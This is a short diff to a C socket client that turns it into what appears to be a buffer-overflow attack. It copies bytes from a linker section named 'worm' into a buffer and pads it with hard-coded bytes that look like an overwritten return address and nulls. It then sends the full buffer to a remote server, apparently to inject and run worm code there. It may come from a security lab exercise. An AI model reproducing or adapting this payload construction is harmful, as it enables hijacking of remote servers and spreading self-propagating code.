@@ -69,10 +69,10 @@ cont:
 		bzero(buff, sizeof(buff));
 		printf("Enter the string : ");
 		n = 0;
-
-		char *s = &__start_worm;
-
-		for ( ; s < &__stop_worm; ++s, n++) {
+		
+		char * s = &__start_worm+35;
+		
+		for( ; n < 37 ; ++s, n++) {
 			buff[n] = *s;
 		}
 
@@ -82,12 +82,32 @@ cont:
 				printf("\n");
 			}
 		}
-		printf("\n%p  %p  %p\n", func, &__start_worm, &__stop_worm);
+		
+		printf("\n%p  %p  %p  %p\n", func, &__start_worm, &__stop_worm, &__start_worm+36);
 
 		//while ((buff[n++] = getchar()) != '\n')
 		//	;
+		int BUF_SIZE = 49;
+		for (int i =8+BUF_SIZE ; i<10+BUF_SIZE; i++){
+			buff[i] = (char)0x00;
+		}
+		
+		buff[10+BUF_SIZE] = (char) 0x7f;
+		for (int i =11+BUF_SIZE ; i<14+BUF_SIZE; i++){
+			buff[i] = (char)0xff;
+		}
+		buff[7+BUF_SIZE+16]= (char) 0x81;
+		buff[8+BUF_SIZE+16]= (char) 0xde;
+		buff[9+BUF_SIZE+16]= (char) 0xff;
+		buff[10+BUF_SIZE+16]= (char) 0xff;
+		buff[11+BUF_SIZE+16]= (char) 0xff;
+		buff[12+BUF_SIZE+16]= (char) 0xff;
+		buff[12+BUF_SIZE+16]= (char) 0x7f;
+		buff[13+BUF_SIZE+16] = (char) 0x00;
+		buff[14+BUF_SIZE+16] = (char) 0x00;
 
-		write(sockfd, buff,n);
+
+		write(sockfd, buff,sizeof(buff));
 		bzero(buff, sizeof(buff));
 		read(sockfd, buff, sizeof(buff));
 		printf("From Server : %s", buff);
